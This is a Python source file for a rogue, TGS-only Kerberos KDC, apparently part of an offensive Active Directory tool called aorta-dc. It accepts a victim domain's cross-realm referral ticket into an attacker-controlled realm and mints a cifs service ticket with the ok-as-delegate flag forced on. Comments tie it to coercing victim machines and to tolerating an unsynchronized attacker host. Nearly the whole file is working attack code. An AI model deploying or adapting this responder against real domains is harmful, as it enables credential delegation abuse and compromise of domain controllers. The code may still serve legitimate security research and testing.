"""Stateless TCP TGS-only KDC for the aorta-dc responder.

Handles exactly one operation, matching the golden Samba exchange observed
in the recorded captures (see git history for the run reports):

  * a victim KDC's cross-realm referral TGT (``krbtgt/<ATTACKER_REALM>@<VICTIM>``)
    presented via PA-TGS-REQ, requesting ``cifs/<dc_fqdn>``
  * decrypt the referral ticket with the derived trust AES256 key (usage 2)
  * decrypt the authenticator with the referral-TGT session key (usage 7)
  * mint a fresh service ticket with ok-as-delegate and copied lifetimes,
    encrypted with the configured service AES256 key (usage 2)
  * reply part encrypted with the TGT session key / authenticator subkey
    (usage 8)

Clock handling: the victim's time basis is taken from the referral ticket and
authenticator (``authtime``/``endtime``/``renew-till`` are copied verbatim,
``starttime`` comes from the authenticator); the attacker host wall clock is
never consulted, so no clock synchronization is required.

Built on impacket's ASN.1 classes and RFC 3961 crypto primitives.
"""

from __future__ import annotations

import datetime as dt
import hashlib
import logging
import secrets
import struct
from collections import OrderedDict

from impacket.krb5 import crypto
from impacket.krb5.asn1 import (
    AP_REQ,
    KRB_ERROR,
    TGS_REP,
    TGS_REQ,
    Authenticator,
    EncTGSRepPart,
    EncTicketPart,
    seq_set,
)
from impacket.krb5.crypto import Key
from impacket.krb5.crypto import _enctype_table as _etables
from pyasn1.codec.der.decoder import decode as der_decode
from pyasn1.codec.der.encoder import encode as der_encode
from pyasn1.type.univ import noValue

from .keys import ResponderConfig

log = logging.getLogger("kdc")

ETYPE_AES256 = 18
KEY_USAGE_TICKET = 2  # encrypted ticket parts (both sides)
KEY_USAGE_TGS_AUTHENTICATOR = 7
KEY_USAGE_TGS_REP_PART = 8

MAX_RECORD = 1 << 17  # 128 KiB conservative TGS-REQ bound

KDC_ERR_S_PRINCIPAL_UNKNOWN = 7
KDC_ERR_PADATA_TYPE_NOSUPP = 12
KDC_ERR_ETYPE_NOSUPP = 14
KRB_AP_ERR_TKT_EXPIRED = 35
KRB_AP_ERR_REPEAT = 38
KRB_AP_ERR_MODIFIED = 41
KRB_AP_ERR_BADMATCH = 45

# Ticket flags (RFC 4120 bit numbering, MSB-first)
F_FORWARDABLE = 0x40000000
F_RENEWABLE = 0x00800000
F_INITIAL = 0x00400000
F_PRE_AUTHENT = 0x00200000
F_TRANSITED_POLICY_CHECKED = 0x00080000
F_OK_AS_DELEGATE = 0x00040000
F_ENC_PA_REP = 0x00010000

FLAG_NAMES = {
    F_FORWARDABLE: "forwardable",
    F_INITIAL: "initial",
    F_RENEWABLE: "renewable",
    F_PRE_AUTHENT: "pre_authent",
    F_TRANSITED_POLICY_CHECKED: "transited_policy_checked",
    F_OK_AS_DELEGATE: "ok_as_delegate",
    F_ENC_PA_REP: "enc_pa_rep",
}


def encrypt(key: Key, usage: int, plaintext: bytes) -> bytes:
    """crypto.encrypt() wrapper that generates the random confounder itself."""
    return _etables[key.enctype].encrypt(key, usage, plaintext, None)


def flag_names(flags: int) -> list[str]:
    return [name for bit, name in FLAG_NAMES.items() if flags & bit]


def _set_principal_name(field, names: list[str], name_type: int) -> None:
    """Fill a PrincipalName component (pyasn1 needs indexed SequenceOf assignment)."""
    field["name-type"] = name_type
    field["name-string"] = noValue
    for i, name in enumerate(names):
        field["name-string"][i] = name


def _fill_key(field, keytype: int, keyvalue: bytes) -> None:
    field["keytype"] = keytype
    field["keyvalue"] = keyvalue


def _fill_encrypted_data(field, etype: int, cipher: bytes, kvno: int | None = None) -> None:
    field["etype"] = etype
    if kvno is not None:
        field["kvno"] = kvno
    field["cipher"] = cipher


def flags_as_bits(mask: int) -> list[int]:
    """Convert an int ticket-flags mask to pyasn1 BitString bit positions."""
    return [1 if mask & (1 << (31 - i)) else 0 for i in range(32)]


def _krb_error(err_code: int, realm: str, sname: tuple[str, ...], e_text: str | None = None) -> bytes:
    """Encode a KRB_ERROR.  stime is the only place local wall clock is used:
    error replies are informational and carry no ticket lifetime."""
    err = KRB_ERROR()
    err["pvno"] = 5
    err["msg-type"] = 30
    err["stime"] = dt.datetime.now(dt.UTC).strftime("%Y%m%d%H%M%SZ")
    err["susec"] = 0
    err["error-code"] = err_code
    err["realm"] = realm
    _set_principal_name(seq_set(err, "sname"), list(sname), 2)
    if e_text:
        err["e-text"] = e_text
    return der_encode(err)


class ReplayCache:
    """Bounded LRU over (client, ctime, cusec) tuples.

    Tolerant of ``coerce_plus`` hammering: every coercion mints a fresh
    authenticator, so legit traffic never collides; only byte-identical
    authenticators repeat.
    """

    def __init__(self, capacity: int = 1024):
        self.capacity = capacity
        self._seen: OrderedDict[tuple, None] = OrderedDict()

    def seen(self, key: tuple) -> bool:
        if key in self._seen:
            self._seen.move_to_end(key)
            return True
        self._seen[key] = None
        if len(self._seen) > self.capacity:
            self._seen.popitem(last=False)
        return False


class TgsError(Exception):
    def __init__(self, code: int, e_text: str):
        super().__init__(e_text)
        self.code = code
        self.e_text = e_text


class Kdc:
    """One configured, stateless TGS handler instance."""

    def __init__(self, cfg: ResponderConfig):
        self.cfg = cfg
        self.replay = ReplayCache()

    # -- public API --------------------------------------------------------

    def handle_record(self, record: bytes) -> tuple[bytes, bool]:
        """Handle one unframed DER message; returns (response, keep_open)."""
        try:
            return self._handle_tgs_req(record), False
        except TgsError as err:
            log.warning("TGS error (%d): %s", err.code, err.e_text)
            return self._error_response(err), False

    # -- internals -----------------------------------------------------------

    def _error_response(self, err: TgsError) -> bytes:
        return _krb_error(
            err.code,
            self.cfg.realm,
            self.cfg.service_principal,
            e_text=f"aorta-responder: {err.e_text}",
        )

    def _handle_tgs_req(self, record: bytes) -> bytes:
        try:
            tgs, _ = der_decode(record, asn1Spec=TGS_REQ())
        except Exception as exc:
            raise TgsError(KDC_ERR_PADATA_TYPE_NOSUPP, f"malformed TGS-REQ: {exc}") from exc
        if int(tgs["msg-type"]) != 12:
            raise TgsError(KDC_ERR_PADATA_TYPE_NOSUPP, f"msg-type {int(tgs['msg-type'])} not TGS-REQ")

        ap_req = self._find_pa_tgs_req(tgs)
        ticket = ap_req["ticket"]

        # --- validate referral ticket identity -------------------------------
        sname = [str(s) for s in ticket["sname"]["name-string"]]
        if (
            str(ticket["realm"]).upper() != self.cfg.victim_realm
            or len(sname) != 2
            or sname[0].lower() != "krbtgt"
            or sname[1].upper() != self.cfg.realm
        ):
            raise TgsError(
                KRB_AP_ERR_BADMATCH,
                f"referral ticket {ticket['realm']}{sname} is not krbtgt/{self.cfg.realm}@{self.cfg.victim_realm}",
            )
        if int(ticket["enc-part"]["etype"]) != ETYPE_AES256:
            raise TgsError(KDC_ERR_ETYPE_NOSUPP, f"referral ticket etype {int(ticket['enc-part']['etype'])} != AES256")

        # --- decrypt referral ticket (trust key, usage 2) ---------------------
        cipher = ticket["enc-part"]["cipher"].asOctets()
        try:
            ticket_plain = crypto.decrypt(self.cfg.trust_key, KEY_USAGE_TICKET, cipher)
        except Exception as exc:
            raise TgsError(
                KRB_AP_ERR_MODIFIED, f"referral ticket integrity check failed (trust password wrong?): {exc}"
            ) from exc
        try:
            etp, _ = der_decode(ticket_plain, asn1Spec=EncTicketPart())
        except Exception as exc:
            raise TgsError(KRB_AP_ERR_MODIFIED, f"referral ticket plaintext malformed: {exc}") from exc

        ref_flags = int(etp["flags"])
        tgt_key = crypto.Key(int(etp["key"]["keytype"]), etp["key"]["keyvalue"].asOctets())
        client_name = [str(n) for n in etp["cname"]["name-string"]]
        client_realm = str(etp["crealm"]).upper()

        # --- decrypt authenticator (TGT session key, usage 7) -----------------
        try:
            authn_plain = crypto.decrypt(
                tgt_key, KEY_USAGE_TGS_AUTHENTICATOR, ap_req["authenticator"]["cipher"].asOctets()
            )
            authn, _ = der_decode(authn_plain, asn1Spec=Authenticator())
        except Exception as exc:
            raise TgsError(KRB_AP_ERR_MODIFIED, f"authenticator decryption failed: {exc}") from exc

        authn_name = [str(n) for n in authn["cname"]["name-string"]]
        if str(authn["crealm"]).upper() != client_realm or authn_name != client_name:
            raise TgsError(
                KRB_AP_ERR_BADMATCH,
                f"authenticator {authn_name}@{authn['crealm']} != ticket client {client_name}@{client_realm}",
            )

        # --- replay check ------------------------------------------------------
        replay_key = (client_realm, tuple(client_name), str(authn["ctime"]), int(authn["cusec"]))
        if self.replay.seen(replay_key):
            raise TgsError(KRB_AP_ERR_REPEAT, f"replayed authenticator for {client_name}@{client_realm}")

        # --- clock skew observation (victim clock vs local, for the post-capture
        #     faketime hint; never used for any accept/reject decision) ---------
        try:
            _ct = dt.datetime.strptime(str(authn["ctime"]), "%Y%m%d%H%M%SZ").replace(tzinfo=dt.UTC)
            self.cfg.clock_skew = int(_ct.timestamp() - dt.datetime.now(dt.UTC).timestamp())
        except ValueError:
            pass

        # --- temporal consistency (victim time basis only) ---------------------
        self._check_times(etp, authn)

        # --- request body --------------------------------------------------------
        body = tgs["req-body"]
        req_sname = [str(s) for s in body["sname"]["name-string"]] if body["sname"].isValue else []
        req_realm = str(body["realm"]).upper()
        etypes = [int(e) for e in body["etype"]]
        if req_realm != self.cfg.realm:
            raise TgsError(KDC_ERR_S_PRINCIPAL_UNKNOWN, f"requested realm {req_realm} != {self.cfg.realm}")
        if len(req_sname) != len(self.cfg.service_principal) or any(
            a.lower() != b.lower() for a, b in zip(req_sname, self.cfg.service_principal, strict=False)
        ):
            raise TgsError(
                KDC_ERR_S_PRINCIPAL_UNKNOWN,
                f"requested SPN {'/'.join(req_sname) or '<none>'} != {'/'.join(self.cfg.service_principal)}",
            )
        if ETYPE_AES256 not in etypes:
            raise TgsError(KDC_ERR_ETYPE_NOSUPP, f"AES256 not offered (client offered {etypes})")

        # --- checksum of the KDC-REQ-BODY (best-effort, golden: unkeyed MD5) ----
        self._verify_body_checksum(record, authn, client_name)

        # --- build the service ticket ---------------------------------------------
        session_key_raw = secrets.token_bytes(32)
        rep_flags = (ref_flags | F_TRANSITED_POLICY_CHECKED | F_OK_AS_DELEGATE) & ~(F_ENC_PA_REP | F_INITIAL)

        enc_ticket = EncTicketPart()
        _fill_key(seq_set(enc_ticket, "key"), ETYPE_AES256, session_key_raw)
        enc_ticket["flags"] = flags_as_bits(rep_flags)
        _set_principal_name(seq_set(enc_ticket, "cname"), client_name, int(etp["cname"]["name-type"]))
        enc_ticket["crealm"] = client_realm
        transited = seq_set(enc_ticket, "transited")  # golden: tr-type 1, empty contents
        transited["tr-type"] = int(etp["transited"]["tr-type"])
        transited["contents"] = etp["transited"]["contents"].asOctets() if etp["transited"]["contents"].isValue else b""
        enc_ticket["authtime"] = str(etp["authtime"])
        enc_ticket["starttime"] = str(authn["ctime"])
        enc_ticket["endtime"] = str(etp["endtime"])
        if etp["renew-till"].isValue and (ref_flags & F_RENEWABLE):
            enc_ticket["renew-till"] = str(etp["renew-till"])

        ticket_cipher = encrypt(
            Key(ETYPE_AES256, self.cfg.service_key),
            KEY_USAGE_TICKET,
            der_encode(enc_ticket),
        )

        # --- encrypted reply part ---------------------------------------------------
        rep_part = EncTGSRepPart()
        _fill_key(seq_set(rep_part, "key"), ETYPE_AES256, session_key_raw)
        lr = seq_set(rep_part, "last-req")
        lr[0]["lr-type"] = 0
        lr[0]["lr-value"] = "19700101000000Z"  # golden: epoch zero
        rep_part["nonce"] = int(body["nonce"])
        rep_part["flags"] = flags_as_bits(rep_flags)
        rep_part["authtime"] = str(etp["authtime"])
        rep_part["starttime"] = str(authn["ctime"])
        rep_part["endtime"] = str(etp["endtime"])
        if etp["renew-till"].isValue and (ref_flags & F_RENEWABLE):
            rep_part["renew-till"] = str(etp["renew-till"])
        rep_part["srealm"] = self.cfg.realm
        _set_principal_name(seq_set(rep_part, "sname"), list(self.cfg.service_principal), 2)
        # golden: PA-SUPPORTED-ENCTYPES (165) advertising AES128|AES256
        pa_se = seq_set(rep_part, "encrypted_pa_data")
        pa_se[0]["padata-type"] = 165
        pa_se[0]["padata-value"] = struct.pack("<I", 0x18)

        # encrypt with authenticator subkey if present, else TGT session key (usage 8)
        if authn["subkey"].isValue:
            rep_key = Key(int(authn["subkey"]["keytype"]), authn["subkey"]["keyvalue"].asOctets())
            rep_etype = rep_key.enctype
        else:
            rep_key = tgt_key
            rep_etype = ETYPE_AES256
        rep_cipher = encrypt(rep_key, KEY_USAGE_TGS_REP_PART, der_encode(rep_part))

        rep = TGS_REP()
        rep["pvno"] = 5
        rep["msg-type"] = 13
        _set_principal_name(seq_set(rep, "cname"), client_name, 1)
        rep["crealm"] = client_realm
        rep_ticket = seq_set(rep, "ticket")
        rep_ticket["tkt-vno"] = 5
        rep_ticket["realm"] = self.cfg.realm
        _set_principal_name(seq_set(rep_ticket, "sname"), list(self.cfg.service_principal), 2)
        _fill_encrypted_data(seq_set(rep_ticket, "enc-part"), ETYPE_AES256, ticket_cipher, kvno=1)
        _fill_encrypted_data(seq_set(rep, "enc-part"), rep_etype, rep_cipher)

        principal = f"{'/'.join(client_name)}@{client_realm}"
        log.info(
            "TGS %s -> %s [%s]",
            principal,
            "/".join(self.cfg.service_principal),
            ", ".join(flag_names(rep_flags)),
        )
        return der_encode(rep)

    # -- helpers ------------------------------------------------------------

    def _find_pa_tgs_req(self, tgs) -> AP_REQ:
        if not tgs["padata"].isValue:
            raise TgsError(KDC_ERR_PADATA_TYPE_NOSUPP, "TGS-REQ without padata")
        for pa in tgs["padata"]:
            if int(pa["padata-type"]) == 1:  # PA-TGS-REQ
                try:
                    ap, _ = der_decode(pa["padata-value"], asn1Spec=AP_REQ())
                except Exception as exc:
                    raise TgsError(KDC_ERR_PADATA_TYPE_NOSUPP, f"malformed AP-REQ: {exc}") from exc
                return ap
        raise TgsError(KDC_ERR_PADATA_TYPE_NOSUPP, "no PA-TGS-REQ in padata")

    def _check_times(self, etp, authn) -> None:
        """Validate the authenticator against the ticket lifetime (victim clock).

        The local wall clock is deliberately never used (RFC 4120 allows the
        KDC a configurable skew; here the skew is unbounded by design so an
        unsynchronized attacker host still works).
        """

        def to_dt(s: str):
            return dt.datetime.strptime(str(s), "%Y%m%d%H%M%SZ")

        try:
            ctime = to_dt(authn["ctime"])
            end = to_dt(etp["endtime"])
            start = to_dt(etp["starttime"]) if etp["starttime"].isValue else to_dt(etp["authtime"])
        except Exception as exc:
            raise TgsError(KRB_AP_ERR_BADMATCH, f"unparseable ticket/authenticator times: {exc}") from exc
        if ctime > end:
            raise TgsError(
                KRB_AP_ERR_TKT_EXPIRED, f"authenticator time {ctime} after ticket endtime {end} (victim clock basis)"
            )
        if ctime < start:
            # tolerated with a warning: seen in the wild with skewed starttime
            log.debug("authenticator %s earlier than ticket starttime %s (tolerated)", ctime, start)

    def _verify_body_checksum(self, record: bytes, authn, client_name) -> None:
        """Best-effort verification of the req-body checksum in the authenticator.

        The golden Windows client used unkeyed RSA-MD5 (type 7) over the exact
        wire bytes of the bare KDC-REQ-BODY SEQUENCE.  pyasn1 re-encoding is
        not guaranteed to be byte-identical, so the original bytes are sliced
        out of the record.  Other checksum types are logged and accepted.
        """
        if not authn["cksum"].isValue or int(authn["cksum"]["cksumtype"]) != 7:
            if authn["cksum"].isValue:
                log.debug(
                    "authenticator cksumtype %d not verified (only MD5 supported)", int(authn["cksum"]["cksumtype"])
                )
            return
        body = slice_req_body(record)
        if body is None:
            log.debug("could not slice req-body for checksum verification")
            return
        expect = hashlib.md5(body).digest()
        got = authn["cksum"]["checksum"].asOctets()
        if expect != got:
            log.warning("req-body checksum mismatch for %s (continuing)", "/".join(client_name))


def _elements(buf: bytes):
    """Iterate DER TLVs in *buf*: yields (tag, whole_bytes, content_bytes)."""
    out, i = [], 0
    while i < len(buf):
        tag = buf[i]
        j = i + 1
        n = buf[j]
        if n & 0x80:
            k = n & 0x7F
            n = int.from_bytes(buf[j + 1 : j + 1 + k], "big")
            j += 1 + k
        else:
            j += 1
        out.append((tag, buf[i : j + n], buf[j : j + n]))
        i = j + n
    return out


def slice_req_body(record: bytes) -> bytes | None:
    """Return the exact wire bytes of the bare KDC-REQ-BODY SEQUENCE.

    Layout: [APPLICATION 12] SEQUENCE { [1] pvno, [2] msg-type, [3] padata,
    [4] req-body }.  Returns None for anything unexpected.
    """
    try:
        outer = _elements(record)
        if len(outer) != 1:
            return None
        inner = _elements(outer[0][2])
        if len(inner) != 1 or inner[0][0] != 0x30:
            return None
        fields = _elements(inner[0][2])
        for tag, _whole, content in fields:
            if tag == 0xA4:
                return content
    except Exception:
        return None
    return None
